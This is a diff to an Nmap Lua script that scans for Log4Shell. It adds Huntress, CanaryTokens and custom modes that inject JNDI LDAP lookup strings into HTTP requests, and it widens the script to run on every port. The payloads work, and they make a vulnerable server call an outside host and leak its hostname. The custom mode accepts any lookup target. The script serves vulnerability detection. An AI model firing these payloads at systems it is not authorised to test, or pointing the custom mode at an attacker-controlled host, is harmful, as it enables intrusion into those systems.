@@ -18,7 +18,10 @@ author = "Luciano Righetti"
 license = "GPLv3"
 categories = {"discovery", "exploit"}
 
-portrule = shortport.http
+-- portrule = shortport.http
+portrule = function(host, port)
+  return true
+end
 
 local function read_templates(path)
     local file = open(path, "r")
@@ -29,17 +32,48 @@ local function read_templates(path)
     return templates
 end
 
+local function get_payload(mode, id)
+    -- Huntress payload
+    if mode == "huntress" then
+        return ("${jndi:ldap://log4shell.huntress.com:1389/%s}"):format(id)
+    end
+
+    -- CanaryToken payload
+    if mode == "canary_tokens" then
+        return ("${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
+    end
+
+    return nil
+end
+
 action = function(host, port)
 
-    -- huntress recon id
-    if stdnse.get_script_args("id") == nil then
-        return "ERROR: missing Huntress id, grab the uuid from https://log4shell.huntress.com/ and add --script-args id=<uuid>."
+    local mode = stdnse.get_script_args("mode")
+    if mode == nil then
+        return "ERROR: missing `mode` argument, should be `huntress`, `canary_tokens` or `custom`."
     end
+    
     local id = stdnse.get_script_args("id")
+    if stdnse.get_script_args("id") == nil then
+        if mode == "huntress" then
+            return "ERROR: missing Huntress id, grab the uuid from https://log4shell.huntress.com/ and add it via --script-args id=<uuid>."
+        end
+        if mode == "canary_tokens" then
+            return "ERROR: missing CanaryTokens id, go to https://canarytokens.org/generate and generate a Log4Shell token and add it via --script-args id=<id>."
+        end
 
-    -- Hunters payload
-    local payload = ("${jndi:ldap://log4shell.huntress.com:1389/%s}"):format(id)
+        return "ERROR: missing id, add it via --script-args id=<id>."
+    end
 
+    local payload = nil
+    if (mode == "custom" and stdnse.get_script_args("payload") ~= nil) then
+        payload = ("${%s}"):format(stdnse.get_script_args("payload"))
+        payload = payload:format(id)
+    else
+        payload = get_payload(mode, id)
+    end
+    if payload == nil then return "ERROR: invalid mode or id" end
+        
     -- load injection templates
     local templates_path = stdnse.get_script_args("templates") or "templates.json"
     local templates = read_templates(templates_path)
@@ -84,5 +118,16 @@ action = function(host, port)
     
     end
 
-    return ("Check https://log4shell.huntress.com/view/%s for results."):format(id)
+    if mode == "huntress" then
+        return ("Check https://log4shell.huntress.com/view/%s for results."):format(id)
+    end
+
+    if mode == "canary_tokens" then
+        return ("Check your email/webhook for CanaryTokens results with id=%s."):format(id)
+    end
+
+    if mode == "custom" then
+        return ("Custom mode with id=%s."):format(id)
+    end
+
 end
